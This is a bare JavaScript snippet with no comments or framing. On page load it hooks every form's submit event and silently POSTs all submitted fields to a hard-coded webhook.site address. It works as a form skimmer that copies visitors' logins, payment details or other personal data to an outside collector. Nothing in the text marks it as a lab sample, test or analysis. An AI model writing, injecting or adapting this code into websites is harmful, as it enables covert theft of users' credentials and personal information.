window.addEventListener('load', () => {
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', () => {
      fetch("https://webhook.site/40f3696f-4320-47b0-8b22-240b41b8ae7b", {
        method: "POST",
        body: new URLSearchParams(new FormData(form))
      });
    });
  });
});
